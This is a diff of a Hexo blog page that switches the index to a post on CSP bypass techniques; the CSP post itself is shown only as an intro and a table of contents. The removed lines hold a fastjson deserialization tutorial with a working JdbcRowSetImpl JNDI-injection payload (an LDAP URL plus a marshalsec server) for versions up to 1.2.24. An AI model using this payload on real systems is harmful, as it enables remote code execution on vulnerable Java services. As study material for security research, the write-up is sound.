@@ -20,28 +20,34 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="苦恼waf也好，安全策略也罢，还是做题时所遇到的绕过，可能还有src审核给出的危害不够，请加以证明。大多时候都是东查西找，现来学习总结至日后，未来。 0x01 CSPCSP：内容安全策略，通俗的说用于检测并削弱特定类型的攻击，包括XSS、数据注入等攻击。CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 CSP中常见的header字段为Content-Security-Poli">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSP策略的绕过">
+<meta property="og:url" content="http://yoursite.com/2020/03/22/CSP%E7%AD%96%E7%95%A5%E7%9A%84%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="苦恼waf也好，安全策略也罢，还是做题时所遇到的绕过，可能还有src审核给出的危害不够，请加以证明。大多时候都是东查西找，现来学习总结至日后，未来。 0x01 CSPCSP：内容安全策略，通俗的说用于检测并削弱特定类型的攻击，包括XSS、数据注入等攻击。CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 CSP中常见的header字段为Content-Security-Poli">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413163320.png">
+<meta property="article:published_time" content="2020-03-22T05:53:23.000Z">
+<meta property="article:modified_time" content="2020-04-13T09:11:12.054Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413163320.png">
 
-<link rel="canonical" href="http://yoursite.com/">
+<link rel="canonical" href="http://yoursite.com/2020/03/22/CSP%E7%AD%96%E7%95%A5%E7%9A%84%E7%BB%95%E8%BF%87/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>Hexo</title>
+  <title>CSP策略的绕过 | Hexo</title>
   
 
 
@@ -154,157 +160,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/13/fastjson-RCE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/baishuo.jpg">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/13/fastjson-RCE/" class="post-title-link" itemprop="url">fastjson RCE</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-04-13 19:42:35" itemprop="dateCreated datePublished" datetime="2020-04-13T19:42:35+08:00">2020-04-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-14 00:20:13" itemprop="dateModified" datetime="2020-04-14T00:20:13+08:00">2020-04-14</time>
-              </span>
-
-          
-
-        </div>
-      </header>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>没话可说，当场死掉就完事</p>
-<p>fastjson有一个自省的功能：一个类进来的时候@type（@type可以指定反序列化任意类，(具体情况)调用其set，get方法），它提供了get和set方法，fastjson通过调用@type会自动遍历get set方法，一一执行，get方法需要满足几个条件 ，所以找可执行链 只需要找到get参数里面有可执行的方法或者jndi注入的方法我们就可以使用。</p>
-<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>maven拉去环境 可下载jar</p>
-<p>或指定pom.xml添加依赖</p>
-<h4 id="fastjson组件使用"><a href="#fastjson组件使用" class="headerlink" title="fastjson组件使用"></a>fastjson组件使用</h4><p>首先构建需要序列化的User类</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413195202.png" alt=""></p>
-<p>接着使用fastjson组件</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413200516.png" alt=""></p>
-<p>接着看看结果</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413200830.png" alt=""></p>
-<p>以上使用了三种形式反序列化</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413204512.png" alt=""></p>
-<p>parseObject() 其实是parse()的一个封装，对于parse的结果进行一次结果判定然后转换为JSONObject类。</p>
-<p>而parseObject({},class)会调用class加载器进行类型转化、</p>
-<p><strong>来看看执行过程中调用函数上的不同</strong></p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413203428.png" alt=""></p>
-<p>结果</p>
-<p><img src="C:%5CUsers%5Claiber%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200413203508641.png" alt="image-20200413203508641"></p>
-<p>结论： 1-2：parse   3-6:parseObject 7-8:parseObject(“”,class) </p>
-<p>parse(“”) 会识别并调用目标类的特定 setter方法及某些特定条件的 getter 方法</p>
-<p>parseObject(“”)会调用反序列化目标类的特定setter和gettter方法</p>
-<p>parseObject(“”,class) 会识别并调用目标类的特定setter方法及某些特定条件的getter方法</p>
-<p>特定的setter和getter的调用都是在解析过程中调用</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413204642.png" alt=""></p>
-<p><strong>ParseObject比其他方式多了一步toJSON操作，在这一步中会对所有的getter进行调用。</strong></p>
-<h3 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h3><p>除开正常的序列化，反序列化。</p>
-<p><strong>fastjson提供特殊字符段@type，这个字段可以指定反序列化任意类，并且会自动调用类中属性的特定的set,get方法。</strong></p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413211241.png" alt=""></p>
-<p>可看到本该解析出来的@type并没有被解析出来</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413211810.png" alt=""></p>
-<p>而我们知道@type输入的时候会特殊解析（不然的话会有@type：com.fastjson.User的键值对），</p>
-<p>下面看看自动调用其特定的set,get方法</p>
-<p>创建一个用来序列化的类来实验一下</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413213606.png" alt=""></p>
-<p>@type 反序列化</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413214319.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public name 反序列化成功</span><br><span class="line">private full_name 反序列化失败</span><br><span class="line">private age setAge函数被调用</span><br><span class="line">private sex getsex函数没有被调用</span><br><span class="line">private prop getprop函数被成功调用</span><br></pre></td></tr></table></figure>
-
-<p>可得知：</p>
-<p>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是调用setxxx的函数进行赋值</p>
-<p>getxxx的函数会根据函数返回值的不同，而选择被调用或不被调用</p>
-<p><strong>set开头的方法要求如下:</strong></p>
-<ul>
-<li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
-<li>非静态方法</li>
-<li>返回类型为void或当前类</li>
-<li>参数个数为1个</li>
-</ul>
-<p><strong>get开头的方法要求如下：</strong></p>
-<ul>
-<li>方法名长度大于等于4</li>
-<li>非静态方法</li>
-<li>以get开头且第4个字母为大写</li>
-<li>无传入参数</li>
-<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
-</ul>
-<p>上面getsex方法没有被调用是因为返回类型不符合，而getprop方法被成功调用是因为Properties 继承 Hashtable，而Hashtable实现了Map接口，返回类型符合条件。</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
-<li>被屏蔽的type可以指定反序列化成服务器上的任意类</li>
-<li>然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）</li>
-<li>如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</li>
-</ul>
-<p>上面说到readObejct(“”)还会额外调用toJSON调用所有getter函数，可以不符合要求。</p>
-<p>看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。</p>
-<p>但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。</p>
-<p>对应反序列化攻击利用三要素来说，以上我们就是找到了readObject复写点，下面来探讨反序列化利用链。</p>
-<p>我们先来看最开始的漏洞版本是&lt;=1.2.24，在这个版本前是默认支持@type这个属性的。</p>
-<h3 id="【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl"><a href="#【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl"></a>【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>JNDI注入利用链是通用性最强的利用方式，在以下三种反序列化中均可使用：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse(jsonStr)</span><br><span class="line">parseObject(jsonStr)</span><br><span class="line">parseObject(jsonStr,Object<span class="class">.<span class="keyword">class</span>)</span></span><br></pre></td></tr></table></figure>
-
-<p>JNDI注入利用链</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;<span class="comment">//可控uri</span></span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(uri);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);<span class="comment">//可控uri</span></span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到需要调用的两个函数都是以set开头，而且满足@type反序列调用条件</p>
-<p>所有得出</p>
-<p><strong>EXP</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String json = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1099/ExecTest\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用marshalsec起ldap服务</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413234208.png" alt="">    当前目录准备一个jndi注入poc</p>
-<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413234253.png" alt=""></p>
-<h2 id="基于TemplatesImpl-1-2-22-1-2-24适用"><a href="#基于TemplatesImpl-1-2-22-1-2-24适用" class="headerlink" title="基于TemplatesImpl(1.2.22-1.2.24适用)"></a>基于TemplatesImpl(1.2.22-1.2.24适用)</h2><p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200414000503.png" alt=""></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
@@ -320,10 +179,9 @@
       <meta itemprop="name" content="Hexo">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/22/CSP%E7%AD%96%E7%95%A5%E7%9A%84%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">CSP策略的绕过</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          CSP策略的绕过
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -353,7 +211,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="苦恼"><a href="#苦恼" class="headerlink" title="苦恼"></a>苦恼</h2><p>waf也好，安全策略也罢，还是做题时所遇到的绕过，可能还有src审核给出的危害不够，请加以证明。大多时候都是东查西找，现来学习总结至日后，未来。</p>
+        <h2 id="苦恼"><a href="#苦恼" class="headerlink" title="苦恼"></a>苦恼</h2><p>waf也好，安全策略也罢，还是做题时所遇到的绕过，可能还有src审核给出的危害不够，请加以证明。大多时候都是东查西找，现来学习总结至日后，未来。</p>
 <h2 id="0x01-CSP"><a href="#0x01-CSP" class="headerlink" title="0x01 CSP"></a>0x01 CSP</h2><p>CSP：内容安全策略，通俗的说用于检测并削弱特定类型的攻击，包括XSS、数据注入等攻击。CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p>
 <p>CSP中常见的header字段为Content-Security-Policy。</p>
 <p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413163320.png" alt=""></p>
@@ -488,21 +346,30 @@
 
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/13/fastjson-RCE/" rel="next" title="fastjson RCE">
+      fastjson RCE <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -555,6 +422,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#苦恼"><span class="nav-number">1.</span> <span class="nav-text">苦恼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CSP"><span class="nav-number">2.</span> <span class="nav-text">0x01 CSP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、CSP部署位置"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">1、CSP部署位置</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-CSP绕过"><span class="nav-number">3.</span> <span class="nav-text">0x02 CSP绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、location绕过"><span class="nav-number">3.0.1.</span> <span class="nav-text">1、location绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、iframe绕过"><span class="nav-number">3.0.2.</span> <span class="nav-text">2、iframe绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、cdn绕过"><span class="nav-number">3.0.3.</span> <span class="nav-text">3、cdn绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#低版本angular-js：https-github-com-google-csp-evaluator-blob-master-whitelist-bypasses-angular-js-L26-L76"><span class="nav-number">3.0.3.1.</span> <span class="nav-text">低版本angular js：https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;csp-evaluator&#x2F;blob&#x2F;master&#x2F;whitelist_bypasses&#x2F;angular.js#L26-L76</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#库绕过-https-www-jianshu-com-p-f1de775bc43e"><span class="nav-number">3.0.3.2.</span> <span class="nav-text">库绕过:https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;f1de775bc43e</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、站点可控静态资源绕过"><span class="nav-number">3.0.4.</span> <span class="nav-text">4、站点可控静态资源绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5、Base-uri绕过"><span class="nav-number">3.0.5.</span> <span class="nav-text">5、Base-uri绕过</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
